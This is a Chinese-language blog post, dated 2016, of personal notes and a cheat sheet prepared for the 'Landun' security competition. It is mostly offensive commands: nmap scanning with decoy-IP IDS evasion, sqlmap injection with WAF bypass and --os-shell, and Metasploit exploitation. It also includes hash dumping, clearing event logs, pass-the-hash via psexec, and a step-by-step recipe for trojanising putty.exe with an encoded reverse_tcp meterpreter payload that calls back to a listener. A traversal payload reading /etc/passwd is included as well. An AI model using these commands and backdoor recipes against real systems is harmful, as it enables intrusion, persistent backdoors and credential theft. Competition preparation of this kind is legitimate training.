---
title: 蓝盾比赛总结
time: 2016.05.28 12:47:00
layout: post
tags:
- 蓝盾
- 工具
- 安全相关
excerpt: 蓝盾比赛的一些准备与总结

---

# 1. Nmap
首先使用nmap探测内网服务器
	
	主机发现
	nmap -sn -T4 ip/24(断网环境)
	nmap -Pn ip/24(有网环境)
	万能开关 -A  
	返回详细内容 -vv
	完整全面的扫描
	nmap –T4 –A –v targethost
	脚本使用
	nmap --script=brute 192.168.137.* 提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解
	nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.* 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击
	IDS规避
	nmap -v -F -Pn -D192.168.1.100,192.168.1.102,ME -e eth0 -g 3355 192.168.1.1 其中，-F表示快速扫描100个端口；-Pn表示不进行Ping扫描；-D表示使用IP诱骗方式掩盖自己真实IP（其中ME表示自己IP）；-e eth0表示使用eth0网卡发送该数据包；-g 3355表示自己的源端口使用3355；192.168.1.1是被扫描的目标IP地址。
	 nmap --script=vuln 192.168.137.*   检查是否存在常见漏洞
	 假设检查ms08067
	 nmap -P0 --script=smb-check-vulns 10.10.10.130
	
	
----
# 2.sqlmap
备注：(注入的时候最好把设定-v 3 -l 3)

1. 检索当前数据库和当前用户

		sqlmap -u target.com --cookie="1231" -b --current-db -current-user
	
	-b:获取DBMS banner 还有--os用于探测数据库服务器系统 --is-dba 判断当前用户是否为管理 --users 列出所有管理用户 --passwords列出并破解数据库用户的hash --privileges 列出数据库管理员权限
2. 挖取数据库 --dbs（－D） 挖取表 --tables（－T） 挖取列 --columns（—C） 挖掘详细内容 --dump
3. 读文件 -r test.txt 这里加载HTTP请求 加载文本为-m
4. 载入过滤插件  --tamper（这个一般用于绕过waf） 这个具体参照：[http://drops.wooyun.org/tools/4760](http://drops.wooyun.org/tools/4760) 加载多个可用逗号隔开即可
		
		python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
5. 伪静态注入  有些web服务器进行了url rewrite或者网站是伪静态的，无法直接提供测试参数，这样子可以使用*来代替要测试的参数。
6. 请求延迟  在注入过程中请求太频繁的话可能会被防火墙拦截，这时候--delay参数就起作用了。可以设定两次HTTP请求间的延时。有的web程序会在多次错误访问后屏蔽所有请求，这样就导致之后所有的测试无法进行，绕过这个策略可以使用--safe-url，每隔一段时间去访问一个正常的页面。
7. post注入  有两种方法来进行post注入，一种是使用--data参数，将post的key和value用类似GET方式来提交。二是使用-r参数，sqlmap读取用户抓到的POST请求包，来进行POST注入检测。
	
		python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
8. 拆分字符  --param-del

		python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users

9. 避免过多的错误请求被屏蔽
	1. --safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
	2. --safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。

10. 有时候需要在一些环境的前面或者后面加一些字符，保证payload正常运行，就需要参数--prefix,--suffix
	例如，代码中是这样调用数据库的：
		
		$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 
	这时你就需要--prefix和--suffix参数了：
		python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
	这样执行的SQL语句变成：
	
		$query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1"; 
11. 有时候--tables 无法获取到数据库表时，可用使用--common-tables爆破表名 同理 --common-columns 你懂的
12. 如果当前用户有权读取文件，可用使用--file-read
	
		
		python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \--file-read "C:/example.exe" -v 1

	同理 文件上传到服务器操作 --file-write,--file-dest

		python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1

13. 运行操作系统命令 --os-cmd,--os-shell
	
	
		python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \--os-cmd id -v 1
		--os-shell 得到不同的四种shell（ASP、ASPX、PHP、JSP）
		--os-pwn 该指令可与metasploit交互
		--os-cmd  for windows

		
14. cookie注入

		sqlmap.py -u 'target web' --cookie='2313' 即可


 -----
#  3.metasploit
##  常用指令
1. help 
2. search
3. show options
4. show payload
5. set RHOST
6. show target
7. jobs  可以进一步查看进行攻击的模块
8. exploit
9. 修改模块后  再次攻击 rexploit
10. session －l 查看你控制的电脑 session -i 4 查看id为4的被控制机
11. getsystem 利用漏洞，自动提权为SYSTEM
12. execute
13. clearev 清除事件日志
14. 查看具体信息 info
15. getwd 得到当前目录
16. upload -h 上传文件或文件夹到目标机器中 upload netcat.exe c:\
17. download C:\\"Program Files" 记得双斜杠进行转义
18. 搜寻远程目标机上的文件 search -h
19. 使用nmap 

		db_nmap -sP 10.10.10.0/24 
		对存活ip扫描
		db)nmap -p 1-65535 -sV 10.10.10.144
		services 查看扫描得到的服务状态
20. show exploits 显示所有可用的渗透攻击模块
21. show options 显示当前参数的所有内容
22. show payload 查找适合这个攻击的攻击载荷
23. show targets 具体列出受到漏洞影响目标的类型
24. info 得到详细信息
25. auxiliary/scanner/ssh/ssh_login：通过密码字典破解ssh帐号密码
26. run post/windows/gather/smart_hashdump 获取哈希
27. gituidServer 获取明文密码
	
	
	
##psnuffle 口令嗅探
建议在比赛中一直开启

使用过程
	
	use auxiliary/sniffer/psnuffle
	run
即可
## nessus

load nessus装载nessus

nessus_connect 连接nessus服务器

nessus_save 保存nessus登录信息会话

nessus_logout 退出nessus服务器

nessus_help 列出nessus命令

nessus_server_status 检查Nessus服务器的状态

nessus_admin 检测用户是否是管理员

nessus_server_feed Nessus提供的类型

nessus_find_targets 在报告中找一个攻击目标(有漏洞)

nessus_server_prefs 显示服务器控制台

nessus_report_list 列出Nessus报告

nessus_report_get 导入另一个nessus服务器的报告

nessus_report_hosts 列出主机的报告

nessus_report_host_ports 列出主机开放的端口报告

nessus_report_host_detail 列出一个主机的详细的报告

nessus_scan_new 创建一个Nessus的扫描

nessus_scan_status 列出全部Nessus扫描状态

nessus_scan_pause 暂停一个Nessus扫描

nessus_scan_pause_all 暂停全部Nessus扫描

nessus_scan_stop 停止一个Nessus扫描

nessus_scan_stop_all 停止全部Nessus扫描

nessus_scan_resume 重新开始一个Nessus扫描

nessus_scan_resume_all 重新开始全部Nessus扫描

nessus_plugin_list 列出全部插件

nessus_plugin_family 列出一个插件家族

nessus_plugin_details 列出一个特定插件

nessus_user_list 显示Nessus用户

nessus_user_add 添加一个Nessus用户

nessus_user_del 删除一个Nessus用户

nessus_user_passwd 改变Nessus用户的密码

nessus_policy_list 列出全部策略

nessus_policy_del 删除一个策略


## 辅助模块之wmap

	load wmap
	help
	wmap_sites -a http://202.112.50.74
	wmap_sites -l
	wmap_targets -t http://202.112.50.74
	wmap_run -t 开启后，wmap会调用配置好的辅助模块对目标进行扫描
	wmap_run -e 查看扫描后结果
	vulns 自动依据扫描后工作进行攻击
## XSSF模块
	
	load xssf  加载该模块
	xssf_urls  查看xssf攻击配置文件
	xssf_victims
	

## 使用Nessus
1. db_destroy postgres:toor@127.0.0.1/msf3 删除现有数据库
2. db_connect postgres:root@127.0.0.1/msf3
3. load nessus	
4. 	nessus_help 使用该指令可以找到提示
5. 	nessus_connect dookie:s3cr3t@192.168.1.101:8834 ok
6. 	nessus_policy_list
7. 	nessus_scan_new
8. 	nessus_scan_status
9. 	nessus_report_list
## 	木马制作
### 1. 选定攻击载荷
	msfpayload -l | grep 'windows' | grep 'reverse_tcp' | grep 'meterpreter' 
	msfpayload -l 列出攻击载荷
	返回 目标主机 windows ，有回连至监听主机的能力，并支持后渗透功能的木马制作程序
	选择查看详细内容 
	msfpayload windows/meterpreter/reverse_tcp O
### 2. 将攻击载荷进行编码
 这里一般是用msfencode
 
 eg
 	 
 	 msfpayload /windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=80 R | msfencode -t exe /root/example_01/putty.exe -k -o putty_backdoor.exe -e x86/shikata_ga_nai -c 5
 	 第一个参数/windows/meterpreter/reverse_tcp 代表要使用的攻击模块  LHOST是木马需要回连队地址 LPORT 是回连端口 R 表示输出原始二进制格式的攻击载荷 通过管道｜连接作为msfencode的输入
 	 -t  exe 表示输出为exe格式的可执行文件 -x /root/example_o1/putty.exe 表示以原始的putty.exe作为木马载体模版 －k 参数保持作为模版的程序可运行，并在新线程中运行攻击载荷  －o 制定产生带有攻击载荷的文件吗 -e x86/shikata_ga_nai 表示对输出文件进行编码 －c 5 表示编码操作要迭代5次
 	 
###  3. 测试木马的功效
 可以在本地进行测试 
1. 使用msfcli开启监听

		msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=80 E
2. 然后点击刚刚运行制作的putty.exe  在测试主机打开时，攻击机就收到了"Sending the payload handler"
3. 下一步，需要将木马迁移到一个不会被关闭的进程上（因为不迁移，一旦putty.exe被关闭了，我们的木马就无效了）

	run migrate explorer.exe  迁移到explorer.exe 进程


-----
##  一些后渗透命令
1. ipconfig 
2. portfwd端口转发工具
	假设目标端口开启了3389端口，我们可以使用下面的指令转发到本地1234端口
	portwd add -l 1234 -p 3389 -r 192.168.10.142（对方ip）
	接下俩使用本地的rdesktop连接本地1234端口
	rdesktop -u admin -p 1234 127.0.0.0:1234
3. route 
4. search 搜索
5. ps 运行的程序
6. migrate 转移到另外一个进程
7. execute 在目标机器上执行文件  execute －H －f cmd.exe 隐藏执行cmd.exe 若想直接与cmd交互，execute －H -i -f cmd.exe
8. 权限提升 getsystem -h
9. 获取哈希 

		use priv
		run post/windows/gather/hashdump

-----
## 传递哈希值

		use windows/smb/psexec
		set PAYLOAD windows/meterpreter/reverse_tcp
		set LHOST 192.168.33.129
		set LPORT 443
		set RHOST 192.168.33.130
		set SMBPass 31312313131231
		exploit
		
----
## 杂项辅助

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
metsvc后门 http://www.phreedom.org/software/metsvc/
use exploit/multi/handler
set PAYLOAD windows/metsvc_bind_tcp

smb扫描

smb枚举auxiliary/scanner/smb/smb_enumusers

返回DCERPC信息auxiliary/scanner/smb/pipe_dcerpc_auditor

扫描SMB2协议auxiliary/scanner/smb/smb2

扫描smb共享文件auxiliary/scanner/smb/smb_enumshares

枚举系统上的用户auxiliary/scanner/smb/smb_enumusers

SMB登录auxiliary/scanner/smb/smb_login

SMB登录use windows/smb/psexec(通过md5值登录)

扫描组的用户auxiliary/scanner/smb/smb_lookupsid

扫描系统版本auxiliary/scanner/smb/smb_version

空闲增量扫描auxiliary/scanner/ip/ipidseq

mssql扫描(端口tcp1433udp1434)

admin/mssql/mssql_enum MSSQL枚举

admin/mssql/mssql_exec MSSQL执行命令

admin/mssql/mssql_sql MSSQL查询

scanner/mssql/mssql_login MSSQL登陆工具

scanner/mssql/mssql_ping 测试MSSQL的存在和信息

smtp扫描

smtp枚举auxiliary/scanner/smtp/smtp_enum

扫描smtp版本auxiliary/scanner/smtp/smtp_version

snmp扫描

通过snmp扫描设备auxiliary/scanner/snmp/community

ssh扫描

ssh登录auxiliary/scanner/ssh/ssh_login

ssh公共密钥认证登录auxiliary/scanner/ssh/ssh_login_pubkey

扫描ssh版本测试auxiliary/scanner/ssh/ssh_version

telnet扫描

telnet登录auxiliary/scanner/telnet/telnet_login

扫描telnet版本auxiliary/scanner/telnet/telnet_version

tftp扫描

扫描tftp的文件auxiliary/scanner/tftp/tftpbrute

ARP扫描auxiliary/scanner/discovery/arp_sweep

IPv6的邻居发现auxiliary/scanner/discovery/ipv6_neighbor

扫描UDP服务的主机auxiliary/scanner/discovery/udp_probe

检测常用的UDP服务auxiliary/scanner/discovery/udp_sweep

ftp版本扫描scanner/ftp/anonymous

sniffer密码auxiliary/sniffer/psnuffle

snmp扫描scanner/snmp/community

vnc扫描无认证扫描scanner/vnc/vnc_none_auth

扫描X服务器scanner/x11/open_x11

php攻击exploit/unix/webapp/php_include

指定攻击浏览器server/browser_autopwn





-----
# 4.密码破解

Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]


# 5. 其它
1. 目录穿越漏洞   ../.../.../../../etc/passwd%00
2. sql相关  Mysql information_schema  table_schema version() database() 
3. 
 